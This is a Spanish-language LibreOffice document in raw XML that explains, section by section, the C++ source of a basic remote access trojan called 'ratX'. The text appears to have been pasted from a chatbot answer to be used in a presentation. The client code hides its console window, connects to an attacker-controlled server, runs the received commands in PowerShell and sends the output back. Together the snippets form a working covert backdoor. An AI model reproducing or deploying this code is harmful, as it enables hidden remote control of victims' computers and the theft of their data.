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Heading_20_3">
      <style:paragraph-properties fo:break-before="pag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Heading_20_2">
      <style:paragraph-properties fo:break-before="page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Explicación del código RAT (Servidor y Cliente)</text:span></text:h>
      <text:p text:style-name="Text_20_body">El código se divide en dos partes:</text:p>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P1"><text:span text:style-name="Strong_20_Emphasis">Servidor (</text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text">ratX-server.cpp</text:span></text:span><text:span text:style-name="Strong_20_Emphasis">)</text:span> → Espera conexiones y envía comandos. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="Strong_20_Emphasis">Cliente (</text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text">ratX-client.cpp</text:span></text:span><text:span text:style-name="Strong_20_Emphasis">)</text:span> → Se conecta al servidor, ejecuta comandos y envía la respuesta. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Voy a desglosarlo en secciones para que lo puedas presentar de manera clara.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="Strong_20_Emphasis">📌 1. Explicación del Servidor (</text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text">ratX-server.cpp</text:span></text:span><text:span text:style-name="Strong_20_Emphasis">)</text:span></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Inicialización de Winsock</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">void initWinsock() {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>WSADATA wsa;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>if (WSAStartup(MAKEWORD(2, 2), &amp;wsa) != 0) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="8"/>std::cerr &lt;&lt; "Error al inicializar Winsock" &lt;&lt; std::endl;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="8"/>exit(1);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>}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2">
        <text:list-item>
          <text:p text:style-name="P6">Inicia la biblioteca Winsock, necesaria para usar sockets en Windows. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">MAKEWORD(2,2)</text:span> especifica que se usará la versión 2.2 de Winsock. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P7">Si falla, se muestra un mensaje de error y el programa termina. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Creación del Socket del Servidor</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">serverSocket = socket(AF_INET, SOCK_STREAM, 0);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">if (serverSocket == INVALID_SOCKET) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::cerr &lt;&lt; "Error al crear el socket" &lt;&lt; std::endl;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>return 1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3">
        <text:list-item>
          <text:p text:style-name="P8">Crea un socket TCP (<text:span text:style-name="Source_20_Text">SOCK_STREAM</text:span>). </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9">Si la creación falla, se muestra un error y el programa finaliza. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"/></text:h>
      <text:h text:style-name="P10" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Configuración y Vinculación del Socket</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">server.sin_family = AF_INET;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">server.sin_addr.s_addr = INADDR_ANY;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">server.sin_port = htons(PORT);</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">if (bind(serverSocket, (struct sockaddr*)&amp;server, sizeof(server)) == SOCKET_ERROR) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::cerr &lt;&lt; "Error al enlazar el socket" &lt;&lt; std::endl;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>return 1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4">
        <text:list-item>
          <text:p text:style-name="P11">Define la estructura <text:span text:style-name="Source_20_Text">sockaddr_in</text:span> con: </text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P11"><text:span text:style-name="Source_20_Text">AF_INET</text:span>: IPv4 </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P11"><text:span text:style-name="Source_20_Text">INADDR_ANY</text:span>: Acepta conexiones en cualquier IP del servidor. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P11"><text:span text:style-name="Source_20_Text">htons(PORT)</text:span>: Convierte el puerto a formato de red. </text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text">bind()</text:span> asocia el socket con la IP y el puerto. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Modo de Escucha y Aceptación de Clientes</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">listen(serverSocket, 3);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">std::cout &lt;&lt; "[+] Esperando conexiones en el puerto " &lt;&lt; PORT &lt;&lt; "..." &lt;&lt; std::endl;</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">clientSocket = accept(serverSocket, (struct sockaddr*)&amp;client, &amp;clientSize);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">if (clientSocket == INVALID_SOCKET) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::cerr &lt;&lt; "Error al aceptar conexión" &lt;&lt; std::endl;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>return 1;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">}</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text">std::cout &lt;&lt; "[+] Cliente conectado!" &lt;&lt; std::endl;</text:span></text:p>
      <text:p text:style-name="Text_20_body">🔹 <text:span text:style-name="Strong_20_Emphasis">¿Qué hace?</text:span></text:p>
      <text:list text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P13"><text:span text:style-name="Source_20_Text">listen(serverSocket, 3)</text:span>: Pone el servidor en modo escucha con una cola de hasta 3 conexiones. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="Source_20_Text">accept()</text:span>: Espera a que un cliente se conecte y devuelve un nuevo socket para la comunicación. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"/></text:h>
      <text:h text:style-name="P10" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Intercambio de Comandos y Respuestas</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">while (true) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::cout &lt;&lt; "\n&gt; ";</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::string command;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::getline(std::cin, command);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>if (command.empty()) continue;</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>send(clientSocket, command.c_str(), command.length(), 0);</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::string fullResponse;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>while (true) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="8"/>int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="8"/>if (bytesReceived &lt;= 0) break;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="8"/>buffer[bytesReceived] = '\0';</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="8"/>fullResponse += buffer;</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="8"/>if (fullResponse.find("[END]") != std::string::npos) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="12"/>fullResponse = fullResponse.substr(0, fullResponse.find("[END]"));</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="12"/>break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<text:s text:c="4"/>std::cout &lt;&lt; "Respuesta:\n" &lt;&lt; fullResponse &lt;&lt; std::endl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6">
        <text:list-item>
          <text:p text:style-name="P15">Lee un comando desde la consola y lo envía al cliente. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15">Recibe la respuesta en fragmentos y la muestra. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P16">Usa <text:span text:style-name="Source_20_Text">[END]</text:span> como delimitador para detectar el final del mensaje. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Cierre de Conexiones</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">closesocket(clientSocket);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">closesocket(serverSocket);</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text">WSACleanup();</text:span></text:p>
      <text:p text:style-name="Text_20_body">🔹 <text:span text:style-name="Strong_20_Emphasis">¿Qué hace?</text:span></text:p>
      <text:list text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P17">Cierra los sockets. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P18">Libera los recursos de Winsock con <text:span text:style-name="Source_20_Text">WSACleanup()</text:span>. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="Strong_20_Emphasis"/></text:h>
      <text:h text:style-name="P19" text:outline-level="2"><text:span text:style-name="Strong_20_Emphasis">📌 2. Explicación del Cliente (</text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text">ratX-client.cpp</text:span></text:span><text:span text:style-name="Strong_20_Emphasis">)</text:span></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Opción para Ocultar la Consola</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">if (!DisableHiddedConsole) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>HWND hwnd = GetConsoleWindow();</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>ShowWindow(hwnd, SW_HIDE)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8">
        <text:list-item>
          <text:p text:style-name="P20">Si <text:span text:style-name="Source_20_Text">DisableHiddedConsole</text:span> es <text:span text:style-name="Source_20_Text">false</text:span>, oculta la consola usando <text:span text:style-name="Source_20_Text">ShowWindow(hwnd, SW_HIDE)</text:span>. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Inicialización de Winsock y Conexión al Servidor</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">WSADATA wsa;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">WSAStartup(MAKEWORD(2, 2), &amp;wsa);</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">struct sockaddr_in server;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">server.sin_family = AF_INET;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">server.sin_addr.s_addr = inet_addr(SERVER_IP);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">server.sin_port = htons(PORT);</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">if (connect(clientSocket, (struct sockaddr*)&amp;server, sizeof(server)) &lt; 0) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>return 1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9">
        <text:list-item>
          <text:p text:style-name="P21">Inicia Winsock. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P21">Crea un socket TCP. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P21">Define la estructura del servidor (<text:span text:style-name="Source_20_Text">SERVER_IP</text:span> y <text:span text:style-name="Source_20_Text">PORT</text:span>). </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P22">Se conecta al servidor con <text:span text:style-name="Source_20_Text">connect()</text:span>. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"/></text:h>
      <text:h text:style-name="P10" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Recepción de Comandos y Ejecución</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">while (true) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>if (bytesReceived &lt;= 0) break;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>buffer[bytesReceived] = '\0';</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::string command(buffer);</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::string output = executeCommand(command);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>output += "\n[END]";</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>send(clientSocket, output.c_str(), output.length(), 0)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10">
        <text:list-item>
          <text:p text:style-name="P23">Espera a recibir un comando del servidor. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P23">Lo ejecuta con <text:span text:style-name="Source_20_Text">executeCommand()</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P24">Devuelve la salida al servidor, añadiendo <text:span text:style-name="Source_20_Text">[END]</text:span> como delimitador. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Ejecución de Comandos en PowerShell</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">std::string executeCommand(const std::string&amp; command) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::string fullCommand = "powershell -Command \"" + command + "\"";</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>char buffer[BUFFER_SIZE];</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>std::string result;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>FILE* pipe = _popen(fullCommand.c_str(), "r");</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>if (!pipe) return "Error al ejecutar el comando";</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="8"/>result += buffer;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>}</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>_pclose(pipe);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>return result;</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text">}</text:span></text:p>
      <text:p text:style-name="Text_20_body">🔹 <text:span text:style-name="Strong_20_Emphasis">¿Qué hace?</text:span></text:p>
      <text:list text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P25">Recibe un comando como string. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P25">Lo ejecuta en PowerShell con <text:span text:style-name="Source_20_Text">_popen()</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P26">Captura la salida y la devuelve como string. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"/></text:h>
      <text:h text:style-name="P10" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Cierre de Conexión</text:span></text:h>
      <text:p text:style-name="Preformatted_20_Text">cpp</text:p>
      <text:p text:style-name="Preformatted_20_Text">CopyEdit</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">closesocket(clientSocket);</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text">WSACleanup();</text:span></text:p>
      <text:p text:style-name="Text_20_body">🔹 <text:span text:style-name="Strong_20_Emphasis">¿Qué hace?</text:span></text:p>
      <text:list text:style-name="L12">
        <text:list-item>
          <text:p text:style-name="P27">Cierra el socket. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">Libera los recursos de Winsock. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="Strong_20_Emphasis">Conclusión</text:span></text:h>
      <text:p text:style-name="Text_20_body">Este código implementa una RAT básica en C++ con:</text:p>
      <text:list text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P29">Comunicación basada en sockets (Winsock2). </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29">Ejecución remota de comandos usando PowerShell. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29">Control de flujo con delimitadores (<text:span text:style-name="Source_20_Text">[END]</text:span>). </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">Opción para ocultar la consola en el clien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16:40:19.793000000</meta:creation-date>
    <dc:date>2025-03-09T16:40:53.458000000</dc:date>
    <meta:editing-duration>PT34S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="6" meta:paragraph-count="173" meta:word-count="781" meta:character-count="5568" meta:non-whitespace-character-count="4717"/>
    <meta:generator>LibreOffice/24.8.5.2$Windows_X86_64 LibreOffice_project/fddf2685c70b461e7832239a0162a77216259f22</meta:generator>
  </office:meta>
</office:document-meta>
</file>